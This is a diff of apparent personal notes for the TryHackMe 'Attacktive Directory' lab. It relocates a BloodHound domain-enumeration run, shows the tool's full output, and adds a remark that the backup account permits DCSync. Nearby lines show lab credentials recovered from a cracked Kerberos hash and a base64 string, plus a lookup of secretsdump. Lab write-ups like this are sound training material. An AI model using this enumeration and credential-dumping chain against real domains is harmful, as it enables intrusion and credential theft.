@@ -497,6 +497,79 @@ https://tryhackme.com/room/attacktivedirectory
 >john --show ./hash
         $krb5asrep$23$svc-admin@spookysec.local@SPOOKYSEC.LOCAL:management2005
 
+>pip install bloodhound
+>bloodhound-python -v -u svc-admin -p management2005 -ns 10.10.93.200 -d spookysec.local -gc attacktivedirectory.spookysec.local -c all
+        DEBUG: Authentication: username/password
+        DEBUG: Resolved collection methods: rdp, localadmin, group, trusts, dcom, objectprops, acl, session, psremote
+        DEBUG: Using DNS to retrieve domain information
+        DEBUG: Querying domain controller information from DNS
+        DEBUG: Using domain hint: spookysec.local
+        INFO: Found AD domain: spookysec.local
+        DEBUG: Found primary DC: attacktivedirectory.spookysec.local
+        DEBUG: Found Global Catalog server: attacktivedirectory.spookysec.local
+        DEBUG: Using LDAP server: attacktivedirectory.spookysec.local
+        DEBUG: Using base DN: DC=spookysec,DC=local
+        INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+        DEBUG: Authenticating to LDAP server
+        DEBUG: No LAPS attributes found in schema
+        INFO: Found 1 domains
+        INFO: Found 1 domains in the forest
+        INFO: Found 1 computers
+        DEBUG: Writing users to file: users.json
+        INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+        DEBUG: Authenticating to LDAP server
+        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-512
+        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-519
+        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-1118
+        INFO: Found 17 users
+        DEBUG: Finished writing users
+        DEBUG: Writing groups to file: groups.json
+        DEBUG: Querying resolver LDAP for DN CN=Group Policy Creator Owners,CN=Users,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=Domain Admins,CN=Users,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=Cert Publishers,CN=Users,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=Enterprise Admins,CN=Users,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=Schema Admins,CN=Users,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=Domain Controllers,CN=Users,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
+        DEBUG: Querying resolver LDAP for DN CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
+        INFO: Found 53 groups
+        DEBUG: Finished writing groups
+        DEBUG: Opening file for writing: domains.json
+        DEBUG: Don't care about acetype 1
+        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-498
+        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-516
+        INFO: Found 0 trusts
+        DEBUG: Finished writing domain info
+        INFO: Starting computer enumeration with 10 workers
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        DEBUG: Start working
+        INFO: Querying computer: AttacktiveDirectory.spookysec.local
+        DEBUG: Querying computer: AttacktiveDirectory.spookysec.local
+        DEBUG: Resolved: 10.10.93.200
+        DEBUG: Trying connecting to computer: AttacktiveDirectory.spookysec.local
+        DEBUG: DCE/RPC binding: ncacn_np:10.10.93.200[\PIPE\srvsvc]
+        INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
+        DEBUG: Skipping connection because of previous failure
+        DEBUG: Skipping connection because of previous failure
+        DEBUG: Skipping connection because of previous failure
+        DEBUG: Skipping connection because of previous failure
+        DEBUG: Write worker obtained a None value, exiting
+        DEBUG: Write worker is done, closing files
+        INFO: Done in 00M 00S
+
+//bloodhound is awsome https://bloodhound.readthedocs.io/en/latest/
+//The backup user is a high value target and has enough permissions to allow us DCSync
+
 >find / -type f -name 'smbmap.py'
         /opt/smbmap/smbmap.py
 
@@ -572,78 +645,6 @@ https://tryhackme.com/room/attacktivedirectory
 
 >echo YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw | base64 --decode
         backup@spookysec.local:backup2517860r
-
->pip install bloodhound
->bloodhound-python -v -u svc-admin -p management2005 -ns 10.10.93.200 -d spookysec.local -gc attacktivedirectory.spookysec.local -c all
-        DEBUG: Authentication: username/password
-        DEBUG: Resolved collection methods: rdp, localadmin, group, trusts, dcom, objectprops, acl, session, psremote
-        DEBUG: Using DNS to retrieve domain information
-        DEBUG: Querying domain controller information from DNS
-        DEBUG: Using domain hint: spookysec.local
-        INFO: Found AD domain: spookysec.local
-        DEBUG: Found primary DC: attacktivedirectory.spookysec.local
-        DEBUG: Found Global Catalog server: attacktivedirectory.spookysec.local
-        DEBUG: Using LDAP server: attacktivedirectory.spookysec.local
-        DEBUG: Using base DN: DC=spookysec,DC=local
-        INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
-        DEBUG: Authenticating to LDAP server
-        DEBUG: No LAPS attributes found in schema
-        INFO: Found 1 domains
-        INFO: Found 1 domains in the forest
-        INFO: Found 1 computers
-        DEBUG: Writing users to file: users.json
-        INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
-        DEBUG: Authenticating to LDAP server
-        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-512
-        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-519
-        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-1118
-        INFO: Found 17 users
-        DEBUG: Finished writing users
-        DEBUG: Writing groups to file: groups.json
-        DEBUG: Querying resolver LDAP for DN CN=Group Policy Creator Owners,CN=Users,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=Domain Admins,CN=Users,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=Cert Publishers,CN=Users,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=Enterprise Admins,CN=Users,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=Schema Admins,CN=Users,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=Domain Controllers,CN=Users,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
-        DEBUG: Querying resolver LDAP for DN CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=spookysec,DC=local
-        INFO: Found 53 groups
-        DEBUG: Finished writing groups
-        DEBUG: Opening file for writing: domains.json
-        DEBUG: Don't care about acetype 1
-        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-498
-        DEBUG: Querying resolver LDAP for SID S-1-5-21-3591857110-2884097990-301047963-516
-        INFO: Found 0 trusts
-        DEBUG: Finished writing domain info
-        INFO: Starting computer enumeration with 10 workers
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        DEBUG: Start working
-        INFO: Querying computer: AttacktiveDirectory.spookysec.local
-        DEBUG: Querying computer: AttacktiveDirectory.spookysec.local
-        DEBUG: Resolved: 10.10.93.200
-        DEBUG: Trying connecting to computer: AttacktiveDirectory.spookysec.local
-        DEBUG: DCE/RPC binding: ncacn_np:10.10.93.200[\PIPE\srvsvc]
-        INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
-        DEBUG: Skipping connection because of previous failure
-        DEBUG: Skipping connection because of previous failure
-        DEBUG: Skipping connection because of previous failure
-        DEBUG: Skipping connection because of previous failure
-        DEBUG: Write worker obtained a None value, exiting
-        DEBUG: Write worker is done, closing files
-        INFO: Done in 00M 00S
-
-//bloodhound is awsome https://bloodhound.readthedocs.io/en/latest/
 
 >find / -type f -name 'secretsdump.py'
         /opt/impacket/impacket/examples/secretsdump.py
